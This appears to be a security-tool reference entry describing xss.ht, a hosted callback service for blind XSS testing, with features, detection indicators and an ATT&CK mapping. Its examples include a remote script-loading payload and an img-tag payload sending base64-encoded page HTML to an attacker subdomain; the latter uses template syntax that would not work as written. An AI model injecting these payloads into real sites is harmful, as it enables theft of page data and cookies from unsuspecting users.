---
id: tool-xss-ht-382666
url: 'https://xss.ht'
name: xss-ht
tags:
  - xss
  - callback
  - exfiltration
type: tool
verified: false
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T00:11:09.137Z'
validated: true
submitted: true
---
# xss-ht

**Status**: Unverified

## Overview

xss.ht is a free public service for hosting temporary domains and receiving HTTP callbacks, commonly used in XSS testing to confirm payload execution and exfiltrate data like DOM snapshots or cookies.

## Description

It provides disposable URLs (e.g., https://2973956338.xss.ht) for script hosting and logging incoming requests. In offensive security, it's ideal for blind XSS where direct feedback is unavailable, allowing attackers to verify triggers and collect stolen data via GET/POST payloads.

## Features

- Feature 1: Instant subdomain generation for callbacks
- Feature 2: Logs request headers, body, and query params for exfil analysis
- Feature 3: Supports script hosting for dynamic JS payloads

## Installation

### Requirements

- Web browser for access
- No local install needed; fully hosted

### Install Commands

N/A (web-based service)

## Basic Usage

Visit https://xss.ht, generate a domain, and use it in payloads.

### Common Options

| Option | Description |
|--------|-------------|
| Generate Domain | Create unique subdomain for session |
| View Logs | Real-time request viewer |

## Examples

### Example 1: Basic Callback

In XSS payload: `<script src="https://yourid.xss.ht/test.js"></script>`

Server logs the load.

### Example 2: Advanced Usage

Exfil DOM: `<img src="https://yourid.xss.ht/log?data=${btoa(document.body.innerHTML)}">`

Receive base64-encoded HTML in query params.

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[JavaScript]]
- [[Archive via Custom Method]]

### Tactics

- [[Collection]]

## Detection

Indicators and methods for detecting this tool's usage:

- Network logs showing connections to *.xss.ht domains
- Unusual outbound HTTP requests from webviews or browsers
- Payloads referencing xss.ht in input sanitization scans

## Related Procedures


## Related Tools

- [[Burp Suite]]
- [[BeeF Framework]]

## References

- Official site: https://xss.ht
- Usage in XSS hunts: HackerOne reports
